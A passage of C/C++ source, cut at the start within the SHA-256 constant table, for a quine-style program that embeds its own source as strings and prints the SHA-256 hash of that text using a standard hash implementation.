0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2};
void sha256_transform(SHA256_CTX *ctx, const BYTE data[]){
WORD a, b, c, d, e, f, g, h, i, j, t1, t2, m[64];
for (i = 0, j = 0; i < 16; ++i, j += 4)
m[i] = (data[j] << 24) | (data[j + 1] << 16) | (data[j + 2] << 8) | (data[j + 3]);
for (; i < 64; ++i)
m[i] = SIG1(m[i - 2]) + m[i - 7] + SIG0(m[i - 15]) + m[i - 16];
a = ctx->state[0];
b = ctx->state[1];
c = ctx->state[2];
d = ctx->state[3];
e = ctx->state[4];
f = ctx->state[5];
g = ctx->state[6];
h = ctx->state[7];
for (i = 0; i < 64; ++i){
t1 = h + EP1(e) + CH(e, f, g) + k[i] + m[i];
t2 = EP0(a) + MAJ(a, b, c);
h = g;
g = f;
f = e;
e = d + t1;
d = c;
c = b;
b = a;
a = t1 + t2;
}
ctx->state[0] += a;
ctx->state[1] += b;
ctx->state[2] += c;
ctx->state[3] += d;
ctx->state[4] += e;
ctx->state[5] += f;
ctx->state[6] += g;
ctx->state[7] += h;
}
void sha256_init(SHA256_CTX *ctx){
ctx->datalen = 0;
ctx->bitlen = 0;
ctx->state[0] = 0x6a09e667;
ctx->state[1] = 0xbb67ae85;
ctx->state[2] = 0x3c6ef372;
ctx->state[3] = 0xa54ff53a;
ctx->state[4] = 0x510e527f;
ctx->state[5] = 0x9b05688c;
ctx->state[6] = 0x1f83d9ab;
ctx->state[7] = 0x5be0cd19;
}
void sha256_update(SHA256_CTX *ctx, const BYTE data[], size_t len){
WORD i;
for (i = 0; i < len; ++i){
ctx->data[ctx->datalen] = data[i];
ctx->datalen++;
if (ctx->datalen == 64){
sha256_transform(ctx, ctx->data);
ctx->bitlen += 512;
ctx->datalen = 0;
}
}
}
void sha256_final(SHA256_CTX *ctx, BYTE hash[]){
WORD i;
i = ctx->datalen;
if (ctx->datalen < 56){
ctx->data[i++] = 0x80;
while (i < 56)
ctx->data[i++] = 0x00;
}
else{
ctx->data[i++] = 0x80;
while (i < 64)
ctx->data[i++] = 0x00;
sha256_transform(ctx, ctx->data);
for (i = 0; i < 56; i++)
ctx->data[i] = 0;
}
ctx->bitlen += ctx->datalen * 8;
ctx->data[63] = ctx->bitlen;
ctx->data[62] = ctx->bitlen >> 8;
ctx->data[61] = ctx->bitlen >> 16;
ctx->data[60] = ctx->bitlen >> 24;
ctx->data[59] = ctx->bitlen >> 32;
ctx->data[58] = ctx->bitlen >> 40;
ctx->data[57] = ctx->bitlen >> 48;
ctx->data[56] = ctx->bitlen >> 56;
sha256_transform(ctx, ctx->data);
for (i = 0; i < 4; ++i){
hash[i] = (ctx->state[0] >> (24 - i * 8)) & 0x000000ff;
hash[i + 4] = (ctx->state[1] >> (24 - i * 8)) & 0x000000ff;
hash[i + 8] = (ctx->state[2] >> (24 - i * 8)) & 0x000000ff;
hash[i + 12] = (ctx->state[3] >> (24 - i * 8)) & 0x000000ff;
hash[i + 16] = (ctx->state[4] >> (24 - i * 8)) & 0x000000ff;
hash[i + 20] = (ctx->state[5] >> (24 - i * 8)) & 0x000000ff;
hash[i + 24] = (ctx->state[6] >> (24 - i * 8)) & 0x000000ff;
hash[i + 28] = (ctx->state[7] >> (24 - i * 8)) & 0x000000ff;
}
}
char *s[] = {
"#include <stddef.h>",
"#include <cstring>",
"#include <cstdio>",
"#define SHA256_BLOCK_SIZE 32",
"typedef unsigned char BYTE;",
"typedef unsigned int WORD;",
"typedef struct{",
"BYTE data[64];",
"WORD datalen;",
"unsigned long long bitlen;",
"WORD state[8];",
"} SHA256_CTX;",
"#define ROTLEFT(a, b) (((a) << (b)) | ((a) >> (32 - (b))))",
"#define ROTRIGHT(a, b) (((a) >> (b)) | ((a) << (32 - (b))))",
"#define CH(x, y, z) (((x) & (y)) ^ (~(x) & (z)))",
"#define MAJ(x, y, z) (((x) & (y)) ^ ((x) & (z)) ^ ((y) & (z)))",
"#define EP0(x) (ROTRIGHT(x, 2) ^ ROTRIGHT(x, 13) ^ ROTRIGHT(x, 22))",
"#define EP1(x) (ROTRIGHT(x, 6) ^ ROTRIGHT(x, 11) ^ ROTRIGHT(x, 25))",
"#define SIG0(x) (ROTRIGHT(x, 7) ^ ROTRIGHT(x, 18) ^ ((x) >> 3))",
"#define SIG1(x) (ROTRIGHT(x, 17) ^ ROTRIGHT(x, 19) ^ ((x) >> 10))",
"static const WORD k[64] = {",
"0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,",
"0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,",
"0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,",
"0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,",
"0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,",
"0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,",
"0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,",
"0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2};",
"void sha256_transform(SHA256_CTX *ctx, const BYTE data[]){",
"WORD a, b, c, d, e, f, g, h, i, j, t1, t2, m[64];",
"for (i = 0, j = 0; i < 16; ++i, j += 4)",
"m[i] = (data[j] << 24) | (data[j + 1] << 16) | (data[j + 2] << 8) | (data[j + 3]);",
"for (; i < 64; ++i)",
"m[i] = SIG1(m[i - 2]) + m[i - 7] + SIG0(m[i - 15]) + m[i - 16];",
"a = ctx->state[0];",
"b = ctx->state[1];",
"c = ctx->state[2];",
"d = ctx->state[3];",
"e = ctx->state[4];",
"f = ctx->state[5];",
"g = ctx->state[6];",
"h = ctx->state[7];",
"for (i = 0; i < 64; ++i){",
"t1 = h + EP1(e) + CH(e, f, g) + k[i] + m[i];",
"t2 = EP0(a) + MAJ(a, b, c);",
"h = g;",
"g = f;",
"f = e;",
"e = d + t1;",
"d = c;",
"c = b;",
"b = a;",
"a = t1 + t2;",
"}",
"ctx->state[0] += a;",
"ctx->state[1] += b;",
"ctx->state[2] += c;",
"ctx->state[3] += d;",
"ctx->state[4] += e;",
"ctx->state[5] += f;",
"ctx->state[6] += g;",
"ctx->state[7] += h;",
"}",
"void sha256_init(SHA256_CTX *ctx){",
"ctx->datalen = 0;",
"ctx->bitlen = 0;",
"ctx->state[0] = 0x6a09e667;",
"ctx->state[1] = 0xbb67ae85;",
"ctx->state[2] = 0x3c6ef372;",
"ctx->state[3] = 0xa54ff53a;",
"ctx->state[4] = 0x510e527f;",
"ctx->state[5] = 0x9b05688c;",
"ctx->state[6] = 0x1f83d9ab;",
"ctx->state[7] = 0x5be0cd19;",
"}",
"void sha256_update(SHA256_CTX *ctx, const BYTE data[], size_t len){",
"WORD i;",
"for (i = 0; i < len; ++i){",
"ctx->data[ctx->datalen] = data[i];",
"ctx->datalen++;",
"if (ctx->datalen == 64){",
"sha256_transform(ctx, ctx->data);",
"ctx->bitlen += 512;",
"ctx->datalen = 0;",
"}",
"}",
"}",
"void sha256_final(SHA256_CTX *ctx, BYTE hash[]){",
"WORD i;",
"i = ctx->datalen;",
"if (ctx->datalen < 56){",
"ctx->data[i++] = 0x80;",
"while (i < 56)",
"ctx->data[i++] = 0x00;",
"}",
"else{",
"ctx->data[i++] = 0x80;",
"while (i < 64)",
"ctx->data[i++] = 0x00;",
"sha256_transform(ctx, ctx->data);",
"for (i = 0; i < 56; i++)",
"ctx->data[i] = 0;",
"}",
"ctx->bitlen += ctx->datalen * 8;",
"ctx->data[63] = ctx->bitlen;",
"ctx->data[62] = ctx->bitlen >> 8;",
"ctx->data[61] = ctx->bitlen >> 16;",
"ctx->data[60] = ctx->bitlen >> 24;",
"ctx->data[59] = ctx->bitlen >> 32;",
"ctx->data[58] = ctx->bitlen >> 40;",
"ctx->data[57] = ctx->bitlen >> 48;",
"ctx->data[56] = ctx->bitlen >> 56;",
"sha256_transform(ctx, ctx->data);",
"for (i = 0; i < 4; ++i){",
"hash[i] = (ctx->state[0] >> (24 - i * 8)) & 0x000000ff;",
"hash[i + 4] = (ctx->state[1] >> (24 - i * 8)) & 0x000000ff;",
"hash[i + 8] = (ctx->state[2] >> (24 - i * 8)) & 0x000000ff;",
"hash[i + 12] = (ctx->state[3] >> (24 - i * 8)) & 0x000000ff;",
"hash[i + 16] = (ctx->state[4] >> (24 - i * 8)) & 0x000000ff;",
"hash[i + 20] = (ctx->state[5] >> (24 - i * 8)) & 0x000000ff;",
"hash[i + 24] = (ctx->state[6] >> (24 - i * 8)) & 0x000000ff;",
"hash[i + 28] = (ctx->state[7] >> (24 - i * 8)) & 0x000000ff;",
"}",
"}",
"char *s[] = {",
"};",
"char *hex = ",
"unsigned char quote = 34;",
"unsigned char comma = 44;",
"int semicolon = 59;",
"unsigned char lf = 10;",
"SHA256_CTX ctx;",
"void update(unsigned char c){",
"sha256_update(&ctx,&c,1);",
"}",
"void update(char *str){",
"while (*str) update(*(str++));",
"}",
"void output(BYTE* hash){",
"for(int i=0;i<32;i++)printf(hex,hash[i]);",
"}",
"int main()",
"{",
"int header_length_in_line = 126;",
"int s_length_in_line = 175;",
"sha256_init(&ctx);",
"for (int i = 0; i < header_length_in_line; i++){",
"update(s[i]);",
"update(lf);",
"}",
"for (int i = 0; i < s_length_in_line; i++)",
"{",
"update(quote);",
"update(s[i]);",
"update(quote);",
"update(comma);",
"update(lf);",
"}",
"update(s[header_length_in_line]);",
"update(lf);",
"update(s[header_length_in_line+1]);",
"update(quote);",
"update(hex);",
"update(quote);",
"update(semicolon);",
"update(lf);",
"for (int i = header_length_in_line+2; i < s_length_in_line; i++){",
"update(s[i]);",
"update(lf);",
"}",
"BYTE out[32];",
"sha256_final(&ctx,out);",
"output(out);",
"}",
};
char *hex = "%02X";
unsigned char quote = 34;
unsigned char comma = 44;
int semicolon = 59;
unsigned char lf = 10;
SHA256_CTX ctx;
void update(unsigned char c){
sha256_update(&ctx,&c,1);
}
void update(char *str){
while (*str) update(*(str++));
}
void output(BYTE* hash){
for(int i=0;i<32;i++)printf(hex,hash[i]);
}
int main()
{
int header_length_in_line = 126;
int s_length_in_line = 175;
sha256_init(&ctx);
for (int i = 0; i < header_length_in_line; i++){
update(s[i]);
update(lf);
}
for (int i = 0; i < s_length_in_line; i++)
{
update(quote);
update(s[i]);
update(quote);
update(comma);
update(lf);
}
update(s[header_length_in_line]);
update(lf);
update(s[header_length_in_line+1]);
update(quote);
update(hex);
update(quote);
update(semicolon);
update(lf);
for (int i = header_length_in_line+2; i < s_length_in_line; i++){
update(s[i]);
update(lf);
}
BYTE out[32];
sha256_final(&ctx,out);
output(out);
}
```
